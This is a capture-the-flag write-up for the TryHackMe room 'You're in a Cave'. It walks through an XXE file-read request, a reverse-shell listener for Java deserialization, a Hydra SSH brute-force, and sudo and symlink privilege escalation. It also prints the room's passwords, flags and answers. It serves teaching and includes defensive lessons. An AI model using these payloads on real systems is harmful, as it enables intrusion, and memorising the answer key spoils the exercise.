# TryHackMe — You're in a Cave

A simple, step-by-step write-up for the TryHackMe room **You're in a Cave**.

## Table of Contents

- [Introduction](#introduction)
- [1. Scan the Target](#1-scan-the-target)
- [2. Explore the Cave](#2-explore-the-cave)
- [3. Find the Java Source Code](#3-find-the-java-source-code)
- [4. Exploit the Java Deserialization](#4-exploit-the-java-deserialization)
- [5. Find the Door Password](#5-find-the-door-password)
- [6. Access the Door User](#6-access-the-door-user)
- [7. Find the Weapon](#7-find-the-weapon)
- [8. Defeat the Skeleton](#8-defeat-the-skeleton)
- [9. Escape the Cave Container](#9-escape-the-cave-container)
- [10. Escape the Container Completely](#10-escape-the-container-completely)
- [Room Answers](#room-answers)
- [Vulnerabilities Learned](#vulnerabilities-learned)

---

## Introduction

The goal of this room is to explore a Linux machine, discover its vulnerabilities, move between users, and escape a container.

The challenge follows a simple story:

1. Explore a dark cave.
2. Find a hidden door.
3. Discover the door's password.
4. Defeat a skeleton.
5. Find a way through an invisible wall.
6. Escape the container and reach the outside.

### Tools Used

- Nmap
- Netcat
- cURL
- Linux terminal
- Java
- Python
- Hydra
- Exrex
- GPG

> All commands in this write-up are intended for the authorized TryHackMe lab.

## 1. Scan the Target

Start the machine on TryHackMe and connect to the TryHackMe VPN.

Set the target IP:

```bash
export TARGET=10.10.10.10
```

Replace `10.10.10.10` with the actual IP assigned to your machine.

Scan the target:

```bash
nmap -sC -sV -p- "$TARGET"
```

The scan reveals the services running on the machine.

One important port is:

```text
3333/tcp
```

This port runs the cave's custom Java application.

The machine also provides a web server that we can investigate.

## 2. Explore the Cave

Connect to the service using Netcat:

```bash
nc "$TARGET" 3333
```

The server displays:

```text
You find yourself in a cave, what do you do?
```

Try these commands individually.

### Search

```text
search
```

Output:

```text
You can't see anything, the cave is very dark.
```

### Matches

```text
matches
```

Output:

```text
You find a box of matches, it gives enough fire for you to see that you're in /home/cave/src.
```

This tells us the Java application is running from:

```text
/home/cave/src
```

### Lamp

```text
lamp
```

Output:

```text
You grab a lamp, and it gives enough light to search around
```

The application also reveals files such as:

```text
Action.class
RPG.class
RPG.java
Serialize.class
commons-io-2.7.jar
run.sh
```

These files give us an important clue: the application is written in Java.

## 3. Find the Java Source Code

The web server has two interesting endpoints:

```text
/search
/matches
```

Check the first endpoint:

```bash
curl -i "http://$TARGET/search"
```

Then check the second:

```bash
curl -i "http://$TARGET/matches"
```

Both endpoints return Base64-encoded data.

Decode the response:

```bash
curl -s "http://$TARGET/search" | base64 -d
```

The output looks unreadable because it contains a serialized Java object.

The Java source code can be read through the XML External Entity vulnerability in `action.php`.

Send the following request, replacing the target IP if necessary:

```bash
curl -i -X POST "http://$TARGET/action.php" \
  -H 'Content-Type: application/xml' \
  --data-binary '<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///home/cave/src/RPG.java">
]>
<root>&xxe;</root>'
```

The response contains the contents of `RPG.java`.

### Understanding the Vulnerability

An XML External Entity (XXE) vulnerability occurs when an XML parser processes external entities that should not be trusted.

In this case, the entity references a local file:

```xml
<!ENTITY xxe SYSTEM "file:///home/cave/src/RPG.java">
```

The server reads that file and returns its contents.

This gives us access to the application's source code.

### What the Java Code Does

The application receives input and builds a URL:

```java
URL url = new URL("http://cave.thm/" + s);
```

It downloads the response and deserializes it:

```java
Action action = (Action) Serialize.fromString(string);
```

Finally, it executes:

```java
action.action();
```

Inside the `Action` class, the application constructs a shell command using the object's `command` field.

The important code is:

```java
String[] cmd = {
    "/bin/sh",
    "-c",
    "echo \"" + this.command + "\""
};

Process p = Runtime.getRuntime().exec(cmd);
```

The application places the command inside a shell string without safely separating data from shell syntax.

This creates a command-injection vulnerability when an attacker can control the serialized object's contents.

The application also uses Java deserialization on data retrieved from the web server.

These weaknesses form the main attack path.

## 4. Exploit the Java Deserialization

The goal of this stage is to make the Java service process a crafted serialized `Action` object.

The source code contains a method for serializing Java objects:

```java
public static String toString(Serializable o) throws IOException {
    ByteArrayOutputStream baos = new ByteArrayOutputStream();
    ObjectOutputStream oos = new ObjectOutputStream(baos);

    oos.writeObject(o);
    oos.close();

    return Base64.getEncoder().encodeToString(baos.toByteArray());
}
```

This method converts an object into Base64-encoded Java serialization data.

The attack works because the service retrieves a response from a URL based on the input we provide.

The vulnerable XML endpoint can reflect a serialized object supplied through a GET request.

### Prepare a Listener

Determine your TryHackMe VPN IP:

```bash
ip -4 addr show tun0
```

Choose a port for your listener, such as `4444`.

Start Netcat:

```bash
nc -lvnp 4444
```

Keep this terminal open.

### Prepare the Serialized Object

Use the retrieved Java source code to create an `Action` object whose command executes a reverse shell.

The exact serialized payload must contain your VPN IP and listening port.

Use the room's Java source and the `Serialize.toString()` method to generate the Base64 representation.

**Important:** The serialized object must match the Java class expected by the remote application.

### Send the Object Through the Cave

The Java service accepts a path and retrieves the corresponding URL.

The challenge's intended route uses the XML endpoint with a serialized object in the query string.

The general format is:

```text
action.php?<xml>BASE64_SERIALIZED_OBJECT</xml>
```

The Base64 data must be URL-encoded where necessary.

Send the complete URL as input to the service on port `3333`.

If the payload is accepted and the reverse-shell command executes, the listener receives a connection from the target.

You should now have a shell running as the `cave` user.

### Verify Access

Run:

```bash
whoami
```

Expected output:

```text
cave
```

Inspect the home directory:

```bash
cd /home/cave
ls -la
cat info.txt
```

The information file reveals a hidden wooden door and a regular expression.

## 5. Find the Door Password

The door displays this regular expression:

```regex
^ed[h#f]{3}[123]{1,2}xf[!@#*]$
```

Let's understand it.

| Part | Meaning |
|---|---|
| `^` | Start of the string |
| `ed` | Must begin with `ed` |
| `[h#f]{3}` | Three characters selected from `h`, `#`, and `f` |
| `[123]{1,2}` | One or two characters selected from `1`, `2`, and `3` |
| `xf` | Must contain `xf` at this position |
| `[!@#*]` | Must end with one of these characters |
| `$` | End of the string |

Instead of guessing the password, we can generate candidates that match the regular expression.

### Generate a Wordlist

Install Exrex:

```bash
python3 -m pip install exrex
```

Generate the wordlist:

```bash
exrex -o passwords.txt '^ed[h#f]{3}[123]{1,2}xf[!@#*]$'
```

This creates a list of possible passwords.

### Test the Passwords

The room exposes SSH on port `2222`.

Use Hydra against the authorized target:

```bash
hydra -l door -P passwords.txt -s 2222 -t 4 "$TARGET" ssh
```

When the correct credentials are found, save them for the next step.

One password matching the pattern is:

```text
edfh#22xf!
```

Use the credentials discovered on your own target rather than assuming they will always be identical.

## 6. Access the Door User

Connect through SSH:

```bash
ssh -p 2222 door@"$TARGET"
```

Enter the password found in the previous step.

List the files:

```bash
ls -la
```

You should find files including:

```text
info.txt
oldman.gpg
skeleton
```

Read the information file:

```bash
cat info.txt
```

The story explains that an old man has a message and a skeleton blocks the path.

The encrypted file `oldman.gpg` contains the message we need.

## 7. Find the Weapon

The file `oldman.gpg` is encrypted using GPG.

We need the appropriate private key to decrypt it.

### Find the Private Key

The Java source identifies the hostname:

```text
cave.thm
```

The challenge also contains an `adventurer` web directory.

Investigate the virtual host:

```text
adventurer.cave.thm
```

In the lab, add the appropriate target IP and hostname to `/etc/hosts` if required:

```text
TARGET_IP cave.thm adventurer.cave.thm
```

Replace `TARGET_IP` with the machine's actual IP.

Retrieve the private key exposed by the challenge's web directory and save it as:

```text
adventurer.priv
```

Transfer `oldman.gpg` to your working machine if needed.

### Find the Private-Key Passphrase

Read the complete contents of the door user's information file.

Some text is hidden by an escape sequence.

Use:

```bash
cat -v info.txt
```

This displays control characters rather than silently interpreting them.

The clue reveals the private-key passphrase:

```text
breakingbonessince1982
```

### Import the Key

Run:

```bash
gpg --import adventurer.priv
```

Enter the passphrase when prompted.

### Decrypt the Message

Run:

```bash
gpg --output message --no-tty oldman.gpg
```

Read the result:

```bash
cat message
```

The message says:

```text
IT'S DANGEROUS TO GO ALONE! TAKE THIS bone-breaking-war-hammer
```

The required weapon is:

```text
bone-breaking-war-hammer
```

## 8. Defeat the Skeleton

The skeleton program checks the `INVENTORY` environment variable.

First, inspect your current inventory:

```bash
echo "$INVENTORY"
```

Add the weapon:

```bash
export INVENTORY=bone-breaking-war-hammer
```

Run the skeleton program:

```bash
./skeleton
```

The program should reveal the skeleton user's password.

Switch to the skeleton user:

```bash
su skeleton
```

Enter the password returned by the program.

Now inspect the user's home directory:

```bash
cd /home/skeleton
ls -la
cat info.txt
```

The story explains that an invisible wall blocks the path to the root of the tree.

We need to investigate the user's privileges.

## 9. Escape the Cave Container

Check the skeleton user's sudo privileges:

```bash
sudo -l
```

The important permission is:

```text
(root) NOPASSWD: /bin/kill
```

This means the user can execute `/bin/kill` as root without entering a password.

Now inspect `/opt`:

```bash
ls -la /opt
```

Look for:

```text
/opt/link
```

Inspect it:

```bash
ls -la /opt/link
```

The directory contains a symbolic link named:

```text
startcon
```

The link points toward:

```text
../root/start.sh
```

The directory is writable, and the link provides an important clue about how the container starts.

### Inspect the Startup Script

Move the symbolic link into a temporary directory:

```bash
mv /opt/link/startcon /tmp/startcon
```

Read the script:

```bash
cat /tmp/startcon
```

The script starts services and launches the Java application.

The challenge allows us to modify the startup script through the symbolic-link setup.

This creates an opportunity to run a command when the container restarts.

### Understand the Container

Inspect the container information:

```bash
cat /proc/1/cgroup
```

The output contains Docker-related paths.

This confirms that the current environment is running inside a container.

The challenge's intended path uses the available permissions to modify the startup script, then terminate the container's main process.

**Lab note:** Follow the container-restart technique in your own isolated TryHackMe instance. Do not apply it to systems you do not own or have permission to test.

When the modified startup process runs and the connection succeeds, verify the new shell:

```bash
whoami
```

Then inspect:

```bash
cd /root
ls -la
cat info.txt
```

The first flag is stored in this file.

### Cave Flag

```text
THM{no_wall_can_stop_me}
```

## 10. Escape the Container Completely

Getting root inside a container does not necessarily mean getting root on the underlying host.

A container is an isolated environment that shares the host's kernel.

The final part of this challenge explores a container escape.

Start by checking the environment:

```bash
id
```

Inspect the network interfaces:

```bash
ip addr
```

Inspect the process and container information:

```bash
cat /proc/1/cgroup
```

The challenge's final stage involves the container's privileges and its Linux control-group configuration.

The intended technique uses the available container capabilities to execute a command outside the container.

Study the relevant Docker and Linux security configuration in the lab before attempting the final stage.

When you obtain the final shell, inspect the root directory:

```bash
cd /root
ls -la
cat info.txt
```

The final information file contains the outside flag.

### Outside Flag

```text
THM{digging_down_then_digging_up}
```

---

## Room Answers

The following are the answers identified in the room walkthrough.

| Question | Answer |
|---|---|
| What was the weird thing carved on the door? | `^ed[h#f]{3}[123]{1,2}xf[!@#*]$` |
| What weapon did you use to defeat the skeleton? | `bone-breaking-war-hammer` |
| What is the cave flag? | `THM{no_wall_can_stop_me}` |
| What is the outside flag? | `THM{digging_down_then_digging_up}` |

Copy the answers exactly as shown.

---

## Vulnerabilities Learned

### 1. XML External Entity (XXE)

XXE occurs when an XML parser processes external entities that reference files or other resources.

In this challenge, it allows the Java source code to be read from the web server.

**Lesson:** Disable external entity processing when parsing untrusted XML.

### 2. Insecure Java Deserialization

Java objects are reconstructed from serialized data.

The application trusts data retrieved from a web server and deserializes it without an appropriate security boundary.

**Lesson:** Avoid deserializing untrusted data. Use safer data formats and validate inputs.

### 3. Command Injection

The application inserts an object's field directly into a shell command.

This allows shell syntax to be interpreted as commands instead of ordinary text.

**Lesson:** Avoid constructing shell commands from untrusted strings. Use safe APIs and pass arguments separately.

### 4. Password Discovery

The door password follows a known regular expression.

Generating candidates from the expression makes it possible to test the permitted combinations in the lab.

**Lesson:** Predictable password rules can significantly reduce the number of possible passwords.

### 5. Linux Privilege Escalation

The skeleton user has permission to run a specific command as root.

Investigating sudo permissions, symbolic links, and writable files reveals the weakness in the environment.

**Lesson:** Review sudo permissions and file ownership carefully.

### 6. Container Escape

The final stage explores the difference between root inside a container and root on the host.

Container security depends on isolation, Linux capabilities, namespaces, control groups, and the permissions granted to processes.

**Lesson:** Containers should run with only the capabilities they need, and sensitive host resources should not be exposed unnecessarily.

---

## Conclusion

This room demonstrates how several small weaknesses can combine into a complete attack path.

The important lessons are:

- Enumerate the available services.
- Investigate unusual web endpoints.
- Read source code when a vulnerability allows it.
- Understand the difference between XXE, deserialization, and command injection.
- Examine Linux users, permissions, and environment variables.
- Investigate sudo permissions and symbolic links.
- Understand the security boundary between a container and its host.

The most important skill is not memorizing commands. It is understanding why each step works and using that knowledge to investigate the next clue.


# Author

Deadcode

# License 

MIT
